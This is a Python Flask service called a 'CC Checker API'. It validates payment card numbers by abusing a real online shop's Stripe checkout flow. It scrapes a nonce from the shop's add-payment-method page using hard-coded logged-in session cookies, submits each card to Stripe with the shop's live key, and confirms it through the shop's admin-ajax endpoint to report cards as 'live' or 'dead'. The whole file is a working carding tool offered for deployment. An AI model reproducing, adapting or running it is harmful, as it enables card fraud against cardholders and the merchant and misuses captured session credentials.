from flask import Flask, request, jsonify
import requests
import re
import os

app = Flask(__name__)

# EXACT COOKIES
COOKIES = {
    'wordpress_sec_417153a0f5c2f87ed25ef38d98bb3798': 'usljfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cfcc7f214dd3ce843e5685de367f552785729f3c31f8f81dfd09734e768a60625',
    '_ga': 'GA1.1.1745993156.1761639993',
    '__stripe_mid': '588bccab-9133-4397-b3e2-f2785fdd613ca53fc1',
    'woodmart_cookies_1': 'accepted',
    'wordpress_logged_in_417153a0f5c2f87ed25ef38d98bb3798': 'usljfjae2q%7C1762849683%7CQMJOfzvqOWKBhyYcPglKBRgP9RoL3wkMwQKIpQ35fzo%7Cc6e9da7a0844dce9aa65df1edba937f150e7838393e5dd6d652310ab93dc7316',
    'wp-wpml_current_language': 'en',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-29%2008%3A52%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2025-10-29%2008%3A52%3A55%7C%7C%7Cep%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2015%3B%20V2312%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F107.0.0.0%20Mobile%20Safari%2F537.36',
    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fe-led.lv%2Fmy-account%2Fadd-payment-method%2F',
    '_ga_1VF3WFHL9K': 'GS2.1.s1761729777$o4$g0$t1761729777$j60$l0$h0',
    '__stripe_sid': 'df4979dd-7001-409e-881b-4bc937e597948a822d',
}

# EXACT HEADERS
AJAX_HEADERS = {
    'authority': 'e-led.lv',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://e-led.lv',
    'referer': 'https://e-led.lv/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

STRIPE_HEADERS = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
}

def extract_nonce():
    try:
        headers = {
            'authority': 'e-led.lv',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; V2312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
        }
        
        response = requests.get(
            'https://e-led.lv/my-account/add-payment-method/',
            headers=headers,
            cookies=COOKIES,
            timeout=10
        )
        
        patterns = [
            r'"stripe_nonce":"([^"]+)"',
            r'var wc_stripe_params = {[^}]*"nonce":"([^"]+)"',
            r'name="stripe_nonce" value="([^"]+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text)
            if match:
                return match.group(1)
        
        return None
    except Exception as e:
        print(f"Nonce extraction error: {e}")
        return None

def luhn_check(card_number):
    card_number = str(card_number).replace(' ', '').replace('-', '')
    if not card_number.isdigit() or len(card_number) < 13:
        return False
        
    total = 0
    reverse_digits = card_number[::-1]
    
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
        
    return total % 10 == 0

def get_bin_info(card_number):
    try:
        bin_num = card_number[:6]
        response = requests.get(f"https://lookup.binlist.net/{bin_num}", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {
                "scheme": data.get("scheme", "Unknown"),
                "type": data.get("type", "Unknown"), 
                "brand": data.get("brand", "Unknown"),
                "bank": data.get("bank", {}).get("name", "Unknown"),
                "country": data.get("country", {}).get("name", "Unknown")
            }
    except:
        pass
    return {"scheme": "Unknown", "type": "Unknown", "brand": "Unknown", "bank": "Unknown", "country": "Unknown"}

def create_stripe_payment_method(card_data):
    card_number, exp_month, exp_year, cvc = card_data
    
    stripe_data = f"type=card&card[number]={card_number}&card[cvc]={cvc}&card[exp_year]={exp_year}&card[exp_month]={exp_month}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F2ee772a1e3%3B+stripe-js-v3%2F2ee772a1e3%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fe-led.lv&time_on_page=150874&client_attribution_metadata[client_session_id]=3afab764-fb85-4fc8-a752-00b0d33415e7&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=3ec638d7-fa58-4943-88ba-3df3e2cadd96&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=5f4b7095-9d5d-4032-bc0c-511afd16336d4ec3ab&muid=588bccab-9133-4397-b3e2-f2785fdd613ca53fc1&sid=df4979dd-7001-409e-881b-4bc937e597948a822d&key=pk_live_51Kg8dtBXnyl1N5QY5UDJJCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20"
    
    try:
        response = requests.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=STRIPE_HEADERS,
            data=stripe_data,
            cookies=COOKIES,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            return {
                'success': True,
                'pm_id': data.get('id'),
                'response': data
            }
        else:
            return {
                'success': False,
                'error': f'Stripe API Error: {response.status_code}',
                'response_text': response.text
            }
            
    except Exception as e:
        return {
            'success': False,
            'error': f'Stripe Exception: {str(e)}'
        }

def confirm_ajax(pm_id, nonce):
    ajax_data = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm_id,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': nonce
    }
    
    try:
        response = requests.post(
            'https://e-led.lv/wp-admin/admin-ajax.php',
            headers=AJAX_HEADERS,
            data=ajax_data,
            cookies=COOKIES,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            return {
                'success': True,
                'result': data.get('result'),
                'messages': data.get('messages'),
                'response': data
            }
        else:
            return {
                'success': False,
                'error': f'AJAX HTTP Error: {response.status_code}',
                'response_text': response.text
            }
            
    except Exception as e:
        return {
            'success': False,
            'error': f'AJAX Exception: {str(e)}'
        }

# 🔥 YEH WO NAYA ENDPOINT HAI JO TU CHAHATA HAI
@app.route('/cc=<path:cc_data>')
def check_cc_simple(cc_data):
    """Simple CC checking endpoint - exactly like your example"""
    try:
        # CC data parse karo: number|mm|yy|cvc
        parts = cc_data.split('|')
        
        if len(parts) != 4:
            return jsonify({
                "status": "error",
                "message": "Format: /cc=number|mm|yy|cvc"
            })
        
        card_number, exp_month, exp_year, cvc = parts
        
        # Clean card number
        card_clean = str(card_number).replace(' ', '').replace('-', '')
        
        # Luhn Check
        if not luhn_check(card_clean):
            return jsonify({
                "status": "invalid",
                "message": "Luhn check failed",
                "card": card_clean[-4:],
                "bin_info": get_bin_info(card_clean)
            })
        
        # Extract Nonce
        nonce = extract_nonce()
        if not nonce:
            return jsonify({
                "status": "error",
                "message": "Cannot extract security nonce"
            })
        
        # Create Stripe Payment Method
        card_data = [card_clean, exp_month, exp_year, cvc]
        stripe_result = create_stripe_payment_method(card_data)
        
        if not stripe_result['success']:
            return jsonify({
                "status": "dead",
                "message": stripe_result.get('error', 'Payment method creation failed'),
                "card": card_clean[-4:],
                "bin_info": get_bin_info(card_clean)
            })
        
        pm_id = stripe_result['pm_id']
        
        # Confirm via AJAX
        ajax_result = confirm_ajax(pm_id, nonce)
        
        if ajax_result['success']:
            if ajax_result.get('result') == 'success':
                return jsonify({
                    "status": "live",
                    "message": "Card is LIVE and valid",
                    "card": card_clean[-4:],
                    "bin_info": get_bin_info(card_clean)
                })
            else:
                return jsonify({
                    "status": "dead", 
                    "message": ajax_result.get('messages', 'Card declined'),
                    "card": card_clean[-4:],
                    "bin_info": get_bin_info(card_clean)
                })
        else:
            return jsonify({
                "status": "error",
                "message": ajax_result.get('error', 'Confirmation failed'),
                "card": card_clean[-4:]
            })
            
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Processing error: {str(e)}"
        })

# OLD ENDPOINTS BHI RAHENGE
@app.route('/check', methods=['POST'])
def check_card():
    """Original JSON endpoint"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify({
                'status': 'error',
                'message': 'No JSON data provided'
            })
        
        card_number = data.get('card_number', '').replace(' ', '').replace('-', '')
        exp_month = data.get('exp_month', '')
        exp_year = data.get('exp_year', '')
        cvc = data.get('cvc', '')
        
        if not all([card_number, exp_month, exp_year, cvc]):
            return jsonify({
                'status': 'error', 
                'message': 'Missing card details'
            })
        
        if len(card_number) < 13:
            return jsonify({
                'status': 'error',
                'message': 'Invalid card number length'
            })
        
        if not luhn_check(card_number):
            return jsonify({
                'status': 'invalid',
                'message': 'Luhn check failed',
                'card': card_number[-4:],
                'bin_info': get_bin_info(card_number)
            })
        
        nonce = extract_nonce()
        if not nonce:
            return jsonify({
                'status': 'error',
                'message': 'Cannot extract security nonce from page'
            })
        
        card_data = [card_number, exp_month, exp_year, cvc]
        stripe_result = create_stripe_payment_method(card_data)
        
        if not stripe_result['success']:
            return jsonify({
                'status': 'dead',
                'message': stripe_result.get('error', 'Stripe payment method creation failed'),
                'card': card_number[-4:],
                'bin_info': get_bin_info(card_number)
            })
        
        pm_id = stripe_result['pm_id']
        
        ajax_result = confirm_ajax(pm_id, nonce)
        
        if ajax_result['success']:
            if ajax_result.get('result') == 'success':
                return jsonify({
                    'status': 'live',
                    'message': 'Card is LIVE and valid',
                    'card': card_number[-4:],
                    'payment_method': pm_id,
                    'bin_info': get_bin_info(card_number),
                    'ajax_response': ajax_result.get('response')
                })
            else:
                return jsonify({
                    'status': 'dead',
                    'message': ajax_result.get('messages', 'Card declined'),
                    'card': card_number[-4:],
                    'bin_info': get_bin_info(card_number),
                    'ajax_response': ajax_result.get('response')
                })
        else:
            return jsonify({
                'status': 'error',
                'message': ajax_result.get('error', 'AJAX confirmation failed'),
                'card': card_number[-4:]
            })
            
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Processing error: {str(e)}'
        })

@app.route('/status')
def status():
    nonce = extract_nonce()
    return jsonify({
        'status': 'online',
        'platform': 'Render',
        'nonce_available': bool(nonce),
        'cookies_valid': bool(COOKIES),
        'message': 'CC Checker API - Simple URL Format'
    })

@app.route('/')
def home():
    return jsonify({
        'message': 'CC Checker API - Simple URL Format',
        'endpoints': {
            'simple_check': '/cc=number|mm|yy|cvc (GET)',
            'json_check': '/check (POST) - JSON data',
            'status': '/status (GET)'
        },
        'examples': {
            'simple': 'https://your-api.herokuapp.com/cc=4147768578745265|04|2026|168',
            'json': 'POST /check with JSON body'
        }
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port, debug=False)
